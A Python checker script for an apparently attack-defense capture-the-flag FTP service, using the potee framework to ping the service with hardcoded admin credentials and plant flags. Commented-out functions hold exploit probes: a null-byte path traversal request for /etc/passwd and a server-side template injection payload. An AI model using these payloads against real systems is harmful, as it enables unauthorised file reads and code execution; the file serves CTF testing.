import ftplib
import requests
from potee import ServiceBase

port = 21
srv = ServiceBase()



@srv.ping
def ping(host):
    server = ftplib.FTP()
    server.connect(host, 21)
    r = server.login('admin','superstrongpassword')
    if r == '230 Login successful.':
        server.quit()
        return 'pong'

@srv.put("auth")
def login(host, flag):
    server = ftplib.FTP()
    server.connect(host, 21)
    server.login('admin','superstrongpassword')
    with open('document.txt', 'w+') as file:
        file.write(flag)               
        server.storbinary('STOR /document.txt', file)    
    server.quit()

# @srv.get('auth')
# def login(host, session):
#     s = requests.Session() 
#     s.cookies.set("session", session)
#     r = s.get(f"{schema}://{host}:{port}/talks")
    
#     soup = BeautifulSoup(r.text, "html.parser")
#     req = soup.find("h4", class_="checker")
#     return req.text.split(",")[0]

# @srv.exploit("lfi")
# def exploit(host):
#     r = requests.get(f"http://{host}:{port}/images?file=.%00./.%00./.%00./.%00./.%00./etc/passwd")
    
#     if ("root" in r.text) or ("flag" in r.text) or ("bin" in r.text) or ("daemon" in r.text):
#         return 1 
#     else: return 0

# @srv.exploit("ssti")
# def exploit(host):
#     payload = "{{7*7}}"

#     r = requests.get(f"{schema}://{host}:{port}/{payload}", timeout=2)
    
#     soup = BeautifulSoup(r.text, "html.parser")
#     req = soup.find("h3")
#     if "49" in req.text:
#         return 1
#     return 0

    
if __name__ == "__main__":
    srv.run()